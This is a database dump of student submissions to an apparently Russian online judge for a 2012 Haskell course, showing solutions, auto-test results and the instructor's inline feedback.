(1837, 53, '533223', '2012-10-11 06:31:15', 1, 'coins n = [ [x, y, z] | x <- [0..n],  y <- [0..n], z <- [0..n], 2*x +3*y+5*z == n] ', '<br/>Тесты успешно пройдены!'),
(1838, 54, '14561781', '2012-10-11 07:13:28', 1, 'data Scheme = R Double| Parallel Scheme Scheme| Series Scheme Scheme\r\n\r\ntotalResistance (R x) = x\r\n\r\ntotalResistance (Parallel x y) = (totalResistance x*totalResistance y) / (totalResistance x+totalResistance y)\r\n\r\ntotalResistance (Series x y) = totalResistance x + totalResistance y\r\n', '<br/>Тесты успешно пройдены!'),
(1839, 51, '442421', '2012-10-11 07:16:25', 1, 'repeatFunc f n = repeatFunc'' f f n\r\nrepeatFunc'' g f 1 = g\r\nrepeatFunc'' g f n = repeatFunc'' (g.f)  f (n-1)', '<br/>Тесты успешно пройдены!'),
(1840, 52, '442421', '2012-10-11 07:35:58', 1, 'repeatFunc f n = foldr (x y -> x.y) f (fList f (n-1))\r\nfList f n = map (getF f) [1..n]\r\ngetF f n = f\r\n ', '<br/>Тесты успешно пройдены!'),
(1841, 54, '442421', '2012-10-11 08:21:49', 1, 'data Scheme =  Resistance Double | Scheme Bool Scheme Scheme deriving Show\r\n\r\n-- Scheme - если Resistance, то сопротивление\r\n--          иначе соединение двух схем, True - паралельное, False - последовательное\r\n\r\ntotalResistance (Resistance n) = n\r\ntotalResistance (Scheme True a b) = totalResistance a * totalResistance b / (totalResistance a + totalResistance b)\r\ntotalResistance (Scheme False a b) = totalResistance a + totalResistance b\r\n\r\n--totalResistance (Scheme False (Resistance 15) (Scheme True (Resistance 20) (Resistance 10) ) )\r\n--totalResistance (Resistance 45)\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1842, 57, '355679', '2012-10-11 08:37:32', 0, 'data Scheme = Resist Double | Par Scheme Scheme | Seq Scheme Scheme deriving Show\n\n\n\nresist (Resist d) = d\n\nresist (Par s1 s2) = ((resist s1) * (resist s2)) / ((resist s1) + (resist s2))\n\nresist (Seq s1 s2) = (resist s1) + (resist s2)\n\n\n\n-- все разбиения множества в виде списка пар списков --\n\nparts [x] = [([x],[])]\n\nparts (x:xs) = foldr\n\n  (\n\n    (l1, l2) res -> let {\n\n      pt1 = (l1, x:l2);\n\n      pt2 = (x:l1, l2);\n\n    } in (\n\n      pt1:(pt2:res)\n\n    )\n\n  )\n\n  []\n\n  (parts xs)\n\n\n\nnonEmptyParts = ( filter ( (s1, s2) -> (length s1 > 0) && (length s2 > 0) ) ) . parts\n\n\n\n-- декартово произведение--\n\ndekart s1 s2 = foldr\n\n  (el1 res -> foldr\n\n    ( el2 res -> (el1, el2) : res )\n\n    res\n\n    s2\n\n  )\n\n  []\n\n  s1\n\n\n\nschemas resistances =\n\n  let {\n\n    leafs = ( foldr\n\n      (\n\n        \r res -> (Resist r):res\n\n      )\n\n      []\n\n      resistances\n\n    );\n\n    smallerSchemas = ( foldr\n\n      (\n\n        (set1, set2) res -> let {\n\n          dek = dekart (schemas set1) (schemas set2);\n\n        } in (\n\n          foldr\n\n            ((schema1, schema2) res -> let {\n\n                par = Par schema1 schema2;\n\n                seq = Seq schema1 schema2;\n\n              } in (\n\n                par : (seq : res)\n\n              )\n\n            )\n\n            res\n\n            dek\n\n        )\n\n      )\n\n      []\n\n      (nonEmptyParts resistances)\n\n    );\n\n  } in (\n\n    leafs ++ smallerSchemas\n\n  )\n\n\n\ncanMakeScheme rs r = length ( filter (s -> resist s == r) (schemas rs) ) > 0\n\n\n\n\n', '<br/>Тесты успешно пройдены!'),
(1843, 51, '214982', '2012-10-11 08:43:00', 1, 'repeatFunc1 p 1 = y -> p y\r\nrepeatFunc1 p x = y -> (repeatFunc1 p (x-1))  (p y) \r\n\r\nrepeatFunc p x = y -> (repeatFunc1 p (x-1) (p y))', '<br/>Тесты успешно пройдены!'),
(1844, 52, '5477377', '2012-10-11 08:52:40', 1, 'ident = (x -> x) : ident\r\n\r\nrepeatFunc f n =  let listF = f : listF in \r\n				foldr (.) (x -> x) (take n listF )\r\n  --- OK, очень хорошо! \r\n', '<br/>Тесты успешно пройдены!'),
(1845, 53, '442421', '2012-10-11 09:02:13', 1, 'coins n = [[x,y,z] | x <-[0..(div n 2)], y<-[0..(div n 3)], z<-[0..(div n 5)], (2*x+3*y+5*z)==n]\r\n', '<br/>Тесты успешно пройдены!'),
(1846, 57, '355679', '2012-10-11 09:09:02', 1, 'resistPar r1 r2 = (r1 * r2) / (r1 + r2)\r\n\r\nresistSeq r1 r2 = r1 + r2\r\n\r\n\r\n\r\n-- все разбиения множества в виде списка пар списков --\r\n\r\nparts [x] = [([x],[])]\r\n\r\nparts (x:xs) = foldr\r\n\r\n  (\r\n\r\n    (l1, l2) res -> let {\r\n\r\n      pt1 = (l1, x:l2);\r\n\r\n      pt2 = (x:l1, l2);\r\n\r\n    } in (\r\n\r\n      pt1:(pt2:res)\r\n\r\n    )\r\n\r\n  )\r\n\r\n  []\r\n\r\n  (parts xs)\r\n\r\n\r\n\r\nnonEmptyParts = ( filter ( (s1, s2) -> (length s1 > 0) && (length s2 > 0) ) ) . parts\r\n\r\n\r\n\r\n-- декартово произведение--\r\n\r\ndekart s1 s2 = foldr\r\n\r\n  (el1 res -> foldr\r\n\r\n    ( el2 res -> (el1, el2) : res )\r\n\r\n    res\r\n\r\n    s2\r\n\r\n  )\r\n\r\n  []\r\n\r\n  s1\r\n\r\n\r\n\r\nschemas resistances =\r\n\r\n  let {\r\n\r\n    smallerSchemas = ( foldr\r\n\r\n      (\r\n\r\n        (set1, set2) res -> let {\r\n\r\n          dek = dekart (schemas set1) (schemas set2);\r\n\r\n        } in (\r\n\r\n          foldr\r\n\r\n            ((r1, r2) res -> let {\r\n\r\n                par = resistPar r1 r2;\r\n\r\n                seq = resistSeq r1 r2;\r\n\r\n              } in (\r\n\r\n                par : (seq : res)\r\n\r\n              )\r\n\r\n            )\r\n\r\n            res\r\n\r\n            dek\r\n\r\n        )\r\n\r\n      )\r\n\r\n      []\r\n\r\n      (nonEmptyParts resistances)\r\n\r\n    );\r\n\r\n  } in (\r\n\r\n    resistances ++ smallerSchemas\r\n\r\n  )\r\n\r\n\r\n\r\ncanMakeScheme rs r = elem r (schemas rs)\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1847, 48, '3742311', '2012-10-11 10:10:28', 0, 'myreverse l = (foldr (x f -> (s -> f (x:s))) (s -> l) l) []', 'Выражение имеет неправильное значение: myreverse [1,2,3,4]'),
(1848, 48, '3742311', '2012-10-11 10:11:02', 0, 'myreverse l = (foldr (x f -> (s -> f (x:s))) (s -> s) l) []', 'Не удалось вычислить выражение "myreverse [1,2,3,4]", проверьте правильность синтаксиса'),
(1849, 48, '3742311', '2012-10-11 10:11:40', 1, 'myreverse s = (foldr (x f -> (l -> f (x:l))) (l -> l) s) []', '<br/>Тесты успешно пройдены!'),
(1850, 56, 'hasp', '2012-10-11 11:48:00', 1, 'gen n k l@(x:xs) = if n == k+1 then map (	 -> [t]) l else let lws = gen n (k+1) l in  concatMap (	 -> map (p -> t:p) lws) l\r\nallLists n k = gen k 0 [1..n]\r\n', '<br/>Тесты успешно пройдены!'),
(1851, 56, '3742311', '2012-10-11 12:18:17', 1, 'allLists n 1 = map (x -> [x]) [1..n]\r\n   --- или для единообразия allLists n 1 = [[i] | i<-[1..n]]\r\nallLists n k = [i:j | i <- [1..n], j <- allLists n (k - 1)]', '<br/>Тесты успешно пройдены!'),
(1852, 51, 'jogrms', '2012-10-11 13:56:15', 2, 'repeatFunc f 0 = id\r\nrepeatFunc f n = f . repeatFunc f (n - 1) \r\n  --- Нет, к сожалению, вы слишком поздно прислали. Крайний срок - начало пары, 13:40', '<br/>Тесты успешно пройдены!'),
(1853, 52, 'jogrms', '2012-10-11 14:11:56', 2, 'repeatFunc f n = foldl1 (.) $ replicate n f\r\n  --- Нет, к сожалению, вы слишком поздно прислали. Крайний срок - начало пары, 13:40', '<br/>Тесты успешно пройдены!'),
(1854, 53, 'jogrms', '2012-10-11 16:08:43', 2, 'coins :: Int -> [[Int]]\r\ncoins n = [[k, l, m] | k <- [0 .. div n 2], l <- [0 .. div (n - 2 * k) 3], m <- [0 .. div (n - 2 * k - 3 * l) 5], 2 * k + 3 * l + 5 * m == n]\r\n    --- Нет, к сожалению, вы слишком поздно прислали. Крайний срок - начало пары, 13:40\r\n    --- (Но ОК, в порядне исключения вы можете сделать 11-4, поскольку ее мы еще не разбирали.) ', '<br/>Тесты успешно пройдены!'),
(1855, 54, 'jogrms', '2012-10-11 16:29:12', 1, 'data Scheme t = Res t | Par (Scheme t) (Scheme t) | Seq (Scheme t) (Scheme t)\r\n\r\ntotalResistance (Res r) = r\r\ntotalResistance (Seq s1 s2) = totalResistance s1 + totalResistance s2\r\ntotalResistance (Par s1 s2) = 1 / (1 / totalResistance s1 + 1/ totalResistance s2)', '<br/>Тесты успешно пройдены!'),
(1856, 53, 'jogrms', '2012-10-11 16:30:15', 2, 'coins :: Int -> [[Int]]\r\ncoins n = [[k, l, m] | k <- [0 .. div n 2], l <- [0 .. div (n - 2 * k) 3], m <- [0 .. div (n - 2 * k - 3 * l) 5], 2 * k + 3 * l + 5 * m == n]\r\n   --- Слишком поздно..\r\n', '<br/>Тесты успешно пройдены!'),
(1857, 47, 'jogrms', '2012-10-11 17:43:00', 1, 'powerset :: [a] -> [[a]]\r\npowerset x = f [] x\r\n    where\r\n        f i [] = [i]\r\n        f i (t:ts) = f (i ++ [t]) ts ++ f i ts', '<br/>Тесты успешно пройдены!'),
(1858, 61, '517309', '2012-10-11 17:56:47', 0, 'sumDiv _ = 8\r\nperfects _ = [6,28,496]', 'Выражение имеет неправильное значение: perfects 100'),
(1859, 61, '517309', '2012-10-11 17:58:04', 0, 'sumDiv _ = 10\r\nperfects n = filter (<n) [6,28,496]', 'Выражение имеет неправильное значение: sumDiv 10'),
(1860, 61, '517309', '2012-10-11 18:00:15', 3, 'sumDiv _ = 8\r\nperfects n = filter (<n) [6,28,496]', '<br/>Тесты успешно пройдены!'),
(1861, 62, '517309', '2012-10-11 18:00:53', 3, 'amicables _ = [(220,284)]', '<br/>Тесты успешно пройдены!'),
(1862, 63, '517309', '2012-10-11 18:01:24', 3, 'fives = [5,55,555,5555,55555,555555]', '<br/>Тесты успешно пройдены!'),
(1863, 47, '9539826', '2012-10-11 19:06:04', 0, 'powerset xs = powerset1 [[]] (head xs) (tail xs)\r\npowerset1 answ elem [] = answ ++ [[elem]++b| b<-answ]\r\npowerset1 answ elem xs = powerset1 (answ ++ [[elem]++b| b<-answ]) (head xs) (tail xs)', 'Не удалось вычислить выражение "powerset []", проверьте правильность синтаксиса'),
(1864, 47, '9539826', '2012-10-11 19:07:57', 2, 'powerset [] = [[]]\r\npowerset xs = powerset1 [[]] (head xs) (tail xs)\r\npowerset1 answ elem [] = answ ++ [[elem]++b| b<-answ]\r\npowerset1 answ elem xs = powerset1 (answ ++ [[elem]++b| b<-answ]) (head xs) (tail xs)\r\n   --- У вас все элементы в подсписках не в стом опрядке, как в исходном списке, а в обратном.\r\n   --- Это просто, но исправьте, пожалуйста.', 'Выражение имеет неправильное значение: elem [1,3] (powerset [1,2,3])'),
(1865, 61, 'Deutsche', '2012-10-11 20:15:26', 0, 'sumDiv :: Integer -> Integer\r\nsumDiv 1 = 0\r\nsumDiv n = sumDiv1 n [1..(n `div` 2)] 0\r\n\r\nsumDiv1 :: Integer -> [Integer] -> Integer -> Integer\r\nsumDiv1 n [] sd = sd\r\nsumDiv1 n (x:xs) sd = if (x==1)\r\n			then sumDiv1 n xs (sd+1)\r\n		      else\r\n			if ((x*x<n)&&(n `mod` x == 0))\r\n				then sumDiv1 n xs (sd+x+(n `div` x))\r\n		      	else \r\n				if (x*x==n)\r\n					then sumDiv1 n [] (sd+x)\r\n			       	else sumDiv1 n xs sd\r\n\r\n-- совершенные числа найдём через описанный sumdiv (не совсем оптимально), но теоретически можно определить \r\n-- через числа Мерсенна (в предположении, что нечётных совершенных чисел нет до входного значения, а их точно не\r\n-- существует до 10^300)\r\nperfects n = [x | x <- [1..n], sumDiv x == x]', '<br/>Тесты успешно пройдены!'),
(1866, 62, 'Deutsche', '2012-10-11 20:27:25', 0, 'sumDiv :: Integer -> Integer\r\nsumDiv 1 = 0\r\nsumDiv n = sumDiv1 n [1..(n `div` 2)] 0\r\n\r\nsumDiv1 :: Integer -> [Integer] -> Integer -> Integer\r\nsumDiv1 n [] sd = sd\r\nsumDiv1 n (x:xs) sd = if (x==1)\r\n			then sumDiv1 n xs (sd+1)\r\n		      else\r\n			if ((x*x<n)&&(n `mod` x == 0))\r\n				then sumDiv1 n xs (sd+x+(n `div` x))\r\n		      	else \r\n				if (x*x==n)\r\n					then sumDiv1 n [] (sd+x)\r\n			       	else sumDiv1 n xs sd\r\n\r\n-- ВАЖНО: рассматриваем только пары различных чисел, т.е. совершенные числа как частный случай не раасматриваем\r\namicables :: Integer -> [(Integer, Integer)]\r\namicables n = [(l, m) | m <- [1..n], l <- [1..(m - 1)], sumDiv l == m, sumDiv m == l]', '<br/>Тесты успешно пройдены!'),
(1867, 63, 'Deutsche', '2012-10-11 20:57:35', 1, 'fives = five 0\r\nfive k = (10*k+5):five (10*k+5)', '<br/>Тесты успешно пройдены!'),
(1868, 47, '533223', '2012-10-11 21:06:40', 0, 'data Tree = Empty| Node [Integer] Tree Tree deriving Show\r\n\r\npowerset xs = getLeafs (makeTree xs (Node [] Empty Empty))\r\n\r\ngetLeafs (Node xs Empty Empty) = [xs]\r\ngetLeafs (Node xs l r) = (getLeafs l) ++ (getLeafs r)\r\n\r\nmakeTree [] tree = tree\r\nmakeTree (x:xs) tree = makeTree xs (addEl x tree)\r\n\r\naddEl x (Node xs Empty Empty) = (Node [] (Node xs Empty Empty) (Node (x:xs) Empty Empty))\r\naddEl x (Node xs l r) = (Node xs (addEl x l) (addEl x r))', 'Выражение имеет неправильное значение: elem [1,3] (powerset [1,2,3])'),
(1869, 61, 'Deutsche', '2012-10-11 21:07:04', 1, 'sumDiv :: Integer -> Integer\r\nsumDiv 1 = 0\r\nsumDiv n = sumDiv1 n [1..(n `div` 2)] 0\r\n\r\nsumDiv1 :: Integer -> [Integer] -> Integer -> Integer\r\nsumDiv1 n [] sd = sd\r\nsumDiv1 n (x:xs) sd = if (x==1)\r\n			then sumDiv1 n xs (sd+1)\r\n		      else\r\n			if ((x*x < n)&&(n `mod` x == 0))\r\n				then sumDiv1 n xs (sd+x+(n `div` x))\r\n		      	else \r\n				if (x*x==n)\r\n					then sumDiv1 n [] (sd+x)\r\n			       	else sumDiv1 n xs sd\r\n\r\n-- совершенные числа найдём через описанный sumdiv (не совсем оптимально), но теоретически можно определить \r\n-- через числа Мерсенна (в предположении, что нечётных совершенных чисел нет до входного значения, а их точно не\r\n-- существует до 10^300)\r\nperfects n = [x | x <- [1..n], sumDiv x == x]', '<br/>Тесты успешно пройдены!'),
(1870, 62, 'Deutsche', '2012-10-11 21:08:35', 1, 'sumDiv :: Integer -> Integer\r\nsumDiv 1 = 0\r\nsumDiv n = sumDiv1 n [1..(n `div` 2)] 0\r\n\r\nsumDiv1 :: Integer -> [Integer] -> Integer -> Integer\r\nsumDiv1 n [] sd = sd\r\nsumDiv1 n (x:xs) sd = if (x==1)\r\n			then sumDiv1 n xs (sd+1)\r\n		      else\r\n			if ((x*x < n)&&(n `mod` x == 0))\r\n				then sumDiv1 n xs (sd+x+(n `div` x))\r\n		      	else \r\n				if (x*x==n)\r\n					then sumDiv1 n [] (sd+x)\r\n			       	else sumDiv1 n xs sd\r\n\r\n-- ВАЖНО: рассматриваем только пары различных чисел, т.е. совершенные числа как частный случай не раасматриваем\r\namicables :: Integer -> [(Integer, Integer)]\r\namicables n = [(l, m) | m <- [1..n], l <- [1..(m - 1)], sumDiv l == m, sumDiv m == l]\r\n  --- OK, но это, кстати, _очень_ неэффективно (по той же причина, которую вы разбирали на примере coins)) \r\n  --- Но OK, мы это разберем', '<br/>Тесты успешно пройдены!'),
(1871, 47, '533223', '2012-10-11 21:09:32', 1, 'data Tree = Empty| Node [Integer] Tree Tree deriving Show\r\n\r\npowerset xs = getLeafs (makeTree (reverse xs) (Node [] Empty Empty))\r\n\r\ngetLeafs (Node xs Empty Empty) = [xs]\r\ngetLeafs (Node xs l r) = (getLeafs l) ++ (getLeafs r)\r\n\r\nmakeTree [] tree = tree\r\nmakeTree (x:xs) tree = makeTree xs (addEl x tree)\r\n\r\naddEl x (Node xs Empty Empty) = (Node [] (Node xs Empty Empty) (Node (x:xs) Empty Empty))\r\naddEl x (Node xs l r) = (Node xs (addEl x l) (addEl x r))\r\n    --- OK, интересное решение! (Но, в принципе, мне кажется, можно было все то же проделать над списками,\r\n    --- деревья не заводить)', '<br/>Тесты успешно пройдены!'),
(1872, 63, 'tonyo', '2012-10-11 21:20:38', 0, 'ones = map (x ->  (10^x-1)*5 `div` 9) [1..]', 'Не удалось вычислить выражение "take 4 fives", проверьте правильность синтаксиса'),
(1873, 63, 'tonyo', '2012-10-11 21:21:03', 1, 'fives = map (x ->  (10^x-1)*5 `div` 9) [1..]\r\n', '<br/>Тесты успешно пройдены!'),
(1874, 61, '472848', '2012-10-11 21:23:27', 0, '--предподсчитываю корень заранее для скорости\r\nsumDiv n = 1 + f 2 n (truncate (sqrt fn)) where fn = fromInteger n\r\n\r\nf i n rn = if (i > rn) then 0\r\nelse if (i == rn && mod n i == 0 && div n i == i) then i\r\nelse if (mod n i == 0) then i + (div n i) + (f (i + 1) n rn)\r\nelse f (i + 1) n rn\r\n\r\nperfects n = [i| i<-[1..n], i == sumDiv i]', 'Выражение имеет неправильное значение: perfects 100'),
(1875, 61, '472848', '2012-10-11 21:24:58', 1, 'sumDiv 1 = 0\r\n--предподсчитываю корень заранее для скорости\r\nsumDiv n = 1 + f 2 n (truncate (sqrt fn)) where fn = fromInteger n\r\n\r\nf i n rn = if (i > rn) then 0\r\nelse if (i == rn && mod n i == 0 && div n i == i) then i\r\nelse if (mod n i == 0) then i + (div n i) + (f (i + 1) n rn)\r\nelse f (i + 1) n rn\r\n\r\nperfects n = [i| i<-[1..n], i == sumDiv i]', '<br/>Тесты успешно пройдены!'),
(1876, 62, '472848', '2012-10-11 21:32:03', 1, 'sumDiv 1 = 0\r\n--предподсчитываю корень заранее для скорости\r\nsumDiv n = 1 + f 2 n (truncate (sqrt fn)) where fn = fromInteger n\r\n\r\nf i n rn = if (i > rn) then 0\r\nelse if (i == rn && mod n i == 0 && div n i == i) then i\r\nelse if (mod n i == 0) then i + (div n i) + (f (i + 1) n rn)\r\nelse f (i + 1) n rn\r\n\r\namicables n = [(i, j)| j <- [2..n], i <- [1..j-1], sumDiv i == j, sumDiv j == i]\r\n   --- На самом деле у вас тут написано _очень_ неэффекктивно, по той же причине, которую мы \r\n   --- обсуждали на примере coins) Но ОК, это мы разберем', '<br/>Тесты успешно пройдены!'),
(1877, 48, '533223', '2012-10-11 21:51:06', 1, 'myreverse xs = foldr (x res ys -> res (x : ys)) id xs []', '<br/>Тесты успешно пройдены!'),
(1878, 61, 'erwert', '2012-10-12 00:12:39', 1, 'mpl a b\r\n	| mod a b == 0 = mpl (div a b) b + 1\r\n	| otherwise = 0\r\n\r\nsdiv a b\r\n	| b == 1 = 1\r\n	| mod b a == 0 = sdiv (a + 1) (div b (a ^ k)) * x\r\n	| otherwise = sdiv (a + 1) b\r\n	where\r\n	k = mpl b a\r\n	x =  div (a ^ (k + 1) - 1) (a - 1)\r\nsumDiv n = sdiv 2 n - n\r\n\r\nperfects n = pref 2 n\r\npref p n\r\n	| x > n = []\r\n	| sumDiv x == x = (x:pref (p+1) n)\r\n	| otherwise = pref (p+1) n\r\n	where \r\n	x = 2 ^ (p - 1) * ( 2 ^ p - 1)', '<br/>Тесты успешно пройдены!'),
(1879, 63, 'erwert', '2012-10-12 00:21:36', 1, 'fv 0 x = x\r\nfv n x = fv (n-1) (10*x+5)\r\nfives  = [ fv t 5 | t <- [0..]]\r\n   --- OK, но это, кстати, не чоень эффективно. Вы каждый раз заново считаете fv, хотя могли бы взять\r\n   --- предыдущее точко что сосчитанное значение fv, и его ''досчитать''', '<br/>Тесты успешно пройдены!'),
(1880, 62, 'erwert', '2012-10-12 01:34:27', 2, 'primes a = not (foldl1 (||) (map (x -> mod a x == 0) [2..(floor.sqrt.fromIntegral) a]))\r\n\r\namicables n = [(min d e, max d e) | t <- [2..div (floor (logBase 2 n)) 3], let a = 3 * 2 ^ (t - 1) - 1; b = 3 * 2 ^ t - 1; c = 9 * 2 ^ (2 * t - 1) - 1; d = 2 ^ t * a * b; e = 2 ^ t * c, primes a, primes b, primes c]\r\n   --- Что-то у вас не совсем правильный ответ? Я вызываю amicables 7000 и получаю\r\n   ---  [(220,284),(17296,18416)]\r\n   --- Но во-первых вторая пара гораздо больше 7000, а во-вторых есть еще много совершенных чисел в этом диапазоне.\r\n   --- В принципе, я засчитываю и не совсем правильные программы, тем более такие умные)\r\n   --- Но может вы исправите?', '<br/>Тесты успешно пройдены!'),
(1881, 61, '12206137', '2012-10-12 06:16:00', 1, 'getDivs n =\r\n\r\n    getDivs [] 1 n\r\n\r\n    where\r\n\r\n        getDivs acc i n\r\n\r\n            | i == n = acc\r\n\r\n            | otherwise =\r\n\r\n                let newAcc = if n `mod` i == 0 then i:acc else acc in\r\n\r\n                getDivs newAcc (i+1) n\r\n   -- Или это можно было написать с помощью filter или list comprehension, мне кажется.\r\n\r\nsumDiv n = sum $ getDivs n\r\n\r\nperfects n = filter (i -> sumDiv i == i) [2..n]\r\n', '<br/>Тесты успешно пройдены!'),
(1882, 62, '12206137', '2012-10-12 06:25:27', 1, 'getDivs n =\r\n\r\n    getDivs [] 1 n\r\n\r\n    where\r\n\r\n        getDivs acc i n\r\n\r\n            | i == n = acc\r\n\r\n            | otherwise =\r\n\r\n                let newAcc = if n `mod` i == 0 then i:acc else acc in\r\n\r\n                getDivs newAcc (i+1) n\r\n\r\n\r\n\r\nsumDiv n = sum $ getDivs n\r\n\r\n\r\n\r\npick f =\r\n\r\n    foldr (x acc -> case f x of\r\n\r\n                        Nothing -> acc\r\n\r\n                        Just v -> v:acc)\r\n\r\n        []\r\n\r\n\r\n\r\nfindPair n v =\r\n\r\n    let v'' = sumDiv v in\r\n\r\n    if v'' > v && v'' <= n && sumDiv v'' == v then Just (v,v'')\r\n\r\n    else Nothing\r\n\r\n\r\n\r\namicables n = pick (findPair n) [1..n]\r\n', '<br/>Тесты успешно пройдены!'),
(1883, 63, '12206137', '2012-10-12 06:29:10', 1, 'fives = 5:(map (i -> i*10 + 5) fives)\r\n', '<br/>Тесты успешно пройдены!'),
(1884, 63, '3607492', '2012-10-12 06:30:55', 0, '\r\nprintFives n k = if (n==k) then (read (take n (repeat ''5''))::Int):[] else (read (take k (repeat ''5''))::Int):(printFives n (k+1))\r\n\r\n\r\nfives n = printFives n 1', 'Не удалось вычислить выражение "take 4 fives", проверьте правильность синтаксиса'),
(1885, 63, '3607492', '2012-10-12 06:33:27', 1, 'printFives k = (read (take k (repeat ''5''))::Int):(printFives (k+1))\r\n\r\n\r\nfives = printFives 1', '<br/>Тесты успешно пройдены!'),
(1886, 63, '329842', '2012-10-12 06:53:17', 1, 'fives = drop 1 (iterate (x -> 10*x+5) 0)\r\n   --- А почему не просто iterate (x -> 10*x+5) 5 ??', '<br/>Тесты успешно пройдены!'),
(1887, 61, '2562137', '2012-10-12 07:16:28', 1, 'sumDiv n = (f n 1 0) - n\r\nf n k sum =\r\n	if (k * k > n) then sum\r\n	else if (k * k == n) then (sum + k)\r\n	else if (mod n k == 0) then f n (k+1) (sum + k + div n k)\r\n	else f n (k+1) sum\r\n\r\nperfects n = filter (x -> x == sumDiv x) [1..n]\r\n', '<br/>Тесты успешно пройдены!'),
(1888, 62, '2562137', '2012-10-12 07:16:48', 1, 'sumDiv n = (f n 1 0) - n\r\nf n k sum =\r\n	if (k * k > n) then sum\r\n	else if (k * k == n) then (sum + k)\r\n	else if (mod n k == 0) then f n (k+1) (sum + k + div n k)\r\n	else f n (k+1) sum\r\n\r\namicables n =\r\n	filter (p -> fst p < snd p && fst p == sumDiv (snd p)) [(x, sumDiv x) | x <- [1..n]]\r\n           --- Ну или можно было вместо filter все проверки записать прямо в list comprehension\r\n', '<br/>Тесты успешно пройдены!'),
(1889, 63, '2562137', '2012-10-12 07:17:12', 1, 'getFive 0 = 0\r\ngetFive k = 10 * (getFive (k-1)) + 5\r\n\r\nfives = [getFive x | x <- [1..]]\r\n   --- OK, но, просто как замечание, в данно м случае это не очень эффективная реалищация.\r\n   --- У вас получается, что для кажого элемента getFive считается заново, а можно\r\n   --- каждое следующее в списке вычислять на основе предыдущего, только что посчитанного.\r\n', '<br/>Тесты успешно пройдены!'),
(1890, 64, '2562137', '2012-10-12 07:17:31', 1, 'data Tree = Node Int Tree Tree | Empty\r\n\r\nfoldTree fun def Empty = def\r\nfoldTree fun def (Node v l r) = \r\n	fun v (fun (foldTree fun def l) (foldTree fun def r))\r\n\r\ntree = Node 1 (Node 2 Empty (Node 4 Empty Empty)) (Node 3 (Node 5 Empty Empty) Empty)\r\n\r\ntest = (\r\n    foldTree (+) 0 tree,\r\n    foldTree (*) 1 tree\r\n	)', '<br/>Тесты успешно пройдены!'),
(1891, 61, '329842', '2012-10-12 07:24:09', 0, 'sumDiv n = foldl (x y -> if rem n y == 0 then x + y else x) 0 [1..n-1]\r\n\r\nperfect n = foldr (x y -> if x == sumDiv x then x:y else y) [] [1..n]', 'Не удалось вычислить выражение "perfects 100", проверьте правильность синтаксиса'),
(1892, 61, '329842', '2012-10-12 07:24:34', 1, 'sumDiv n = foldl (x y -> if rem n y == 0 then x + y else x) 0 [1..n-1]\r\n\r\nperfects n = foldr (x y -> if x == sumDiv x then x:y else y) [] [1..n]', '<br/>Тесты успешно пройдены!'),
(1893, 60, '12206137', '2012-10-12 07:29:59', 0, '// DZ_13_2.cpp : Defines the entry point for the console application.\r\n//\r\n\r\n#include "stdafx.h"\r\n#include <algorithm>\r\n#include <vector>\r\n\r\nusing namespace std;\r\n\r\nbool isAAA(int i) {return i < 10;}\r\n\r\nint _tmain(int argc, _TCHAR* argv[])\r\n{\r\n	int arr[4] = {1, 3, 4, 5};\r\n	vector<int> a(arr, arr + 4);\r\n	vector<int> res(a.size());\r\n\r\n	transform(a.begin(), a.end(), res.begin(), [](int x) {return x*x;});\r\n	for (int i = 0; i < res.size(); i++) {\r\n		printf("%d ", res[i]);\r\n	}\r\n	printf("\n");\r\n	res.resize(remove_if(res.begin(), res.end(), [](int x) {return x < 10;}) - res.begin());\r\n	for (int i = 0; i < res.size(); i++) {\r\n		printf("%d ", res[i]);\r\n	}\r\n	printf("\n");\r\n	return 0;\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1894, 62, '329842', '2012-10-12 07:31:16', 0, 'amicables n = foldr (x y -> if x == sumDiv (sumDiv x) && x < sumDiv x then (x, sumDiv x):y else y) [] [1..n]', 'Не удалось вычислить выражение "amicables 300", проверьте правильность синтаксиса'),
(1895, 62, '329842', '2012-10-12 07:32:07', 0, 'amicables n = foldr (x y -> if x == sumDiv (sumDiv x) && x < sumDiv x then (x, sumDiv x):y else y) [] [1..n]', 'Не удалось вычислить выражение "amicables 300", проверьте правильность синтаксиса'),
(1896, 62, '329842', '2012-10-12 07:33:34', 0, 'amicables n = foldr (x y -> if x == sumDiv (sumDiv x) && x < sumDiv x then (x, sumDiv x):y else y) [] [1..n]\n', 'Не удалось вычислить выражение "amicables 300", проверьте правильность синтаксиса'),
(1897, 62, '329842', '2012-10-12 07:35:57', 1, 'sumDiv n = foldl (x y -> if rem n y == 0 then x + y else x) 0 [1..n-1]\r\n\r\namicables n = foldr (x y -> if x == sumDiv (sumDiv x) && x < sumDiv x then (x, sumDiv x):y else y) [] [1..n]\r\n    --- Тут все-таки наверное имеет смысл воспользоватся let, чтобы не считать sumDiv по два раза\r\n    --- Ну и filter тоже можно было бы воспользоваться)', '<br/>Тесты успешно пройдены!'),
(1898, 60, '12206137', '2012-10-12 07:40:14', 1, '// DZ_13_2.cpp : Defines the entry point for the console application.\r\n//\r\n\r\n#include "stdafx.h"\r\n#include <algorithm>\r\n#include <vector>\r\n\r\nusing namespace std;\r\n\r\nbool isAAA(int i) {return i < 10;}\r\n\r\nvoid nonZeroLastDigits(const int* a, int n) {\r\n	vector<int> input(a, a + n);\r\n	input.resize(remove_if(input.begin(), input.end(), [](int x) {return x % 10 == 0;}) - input.begin());\r\n	vector<int> res(input.size());\r\n	transform(input.begin(), input.end(), res.begin(), [](int x) {return x % 10;});\r\n	for (int i = 0; i < res.size(); i++) {\r\n		printf("%d ", res[i]);\r\n	}\r\n	printf("\r\n");\r\n}\r\n\r\nint _tmain(int argc, _TCHAR* argv[])\r\n{\r\n	int a[4] = {354, 20, 9, 31};\r\n	nonZeroLastDigits(a, 4);\r\n	return 0;\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1899, 59, '12206137', '2012-10-12 07:45:54', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace DZ_13_1 {\r\n    class Program {\r\n        static void nonZeroLastDigits(int[] a) {\r\n            foreach (int x in a.Where(x => x % 10 != 0).Select(x => x % 10)) {\r\n                Console.Write(x + " ");\r\n   --- Засчитано, но вообще-то тут условие было _вернуть_ мессив (а не распечатать его)\r\n            }\r\n        }\r\n        static void Main(string[] args) {\r\n            int[] a = { 354, 20, 9, 31 };\r\n            nonZeroLastDigits(a);\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
